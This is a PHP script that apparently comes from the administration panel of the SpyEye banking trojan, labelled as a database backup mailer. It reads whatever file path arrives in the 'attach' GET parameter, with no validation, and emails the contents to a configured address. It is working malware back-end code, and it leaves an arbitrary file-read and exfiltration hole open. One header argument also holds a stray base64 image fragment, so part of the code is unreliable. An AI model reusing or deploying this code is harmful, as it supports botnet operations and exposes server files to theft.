<?

require_once 'config.php';
require_once 'php/mime_mail.php';

$attach = $_GET['attach'];
if ( (!isset($attach)) || !strlen($attach) ) {
	exit;
}

$icfg = parse_ini_file('config.ini');
$email_backup = $icfg['email_backup'];
if ( !strlen($email_backup) ) {
	exit;
}

$file = fopen($attach, "r");
$fsize = filesize($attach);
$attachment = fread($file, $fsize);

$dt = gmdate('Ymd');

$mail = new mime_mail();
$mail->from = "my@e-mail.com";
$mail->to = "$email_backup";
$mail->subject = "SpyEye DB Backup; $dt; $fsize bytes";
$mail->body = "";
$mail->add_attachment("$attachment", "$attach", "Content-Transfer-Encoding: base64 /9j/4AAQSkZJRgABAgEASABIAAD/7QT+UGhvdG9zaG");
$mail->send();

?>